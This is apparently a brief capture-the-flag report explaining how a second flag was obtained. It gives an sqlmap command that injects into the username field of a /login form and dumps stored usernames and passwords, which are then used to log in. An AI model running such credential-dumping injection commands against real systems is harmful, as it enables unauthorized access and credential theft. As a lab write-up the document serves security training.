
## Title
> Flag

## Description
> Using sqlmap cat fetch username and password.

## Reproduction Steps
1. Run in terminal: sqlmap -u /login --data "username=a&password=b" -p username --dump
2. Wait untill finish
3. Get username and password.
4. Login in /login
5. Flag2 is here